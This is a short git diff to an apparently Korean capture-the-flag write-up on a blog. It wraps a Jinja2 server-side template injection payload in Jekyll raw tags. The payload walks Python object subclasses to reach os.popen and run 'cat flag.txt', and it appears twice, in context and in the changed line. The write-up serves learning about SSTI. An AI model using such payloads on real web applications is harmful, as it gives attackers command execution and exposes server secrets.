@@ -110,7 +110,9 @@ FLAG는 `./flag.txt`에서 읽어와 `app.secret_key`로 저장하고 있다.
 `"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt')`
 ![404x107](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-39-19.png)
 
+{% raw %}
 `{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read()}}`
+{% endraw %}
 ![404x112](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-33-12.png)
 
 </div>
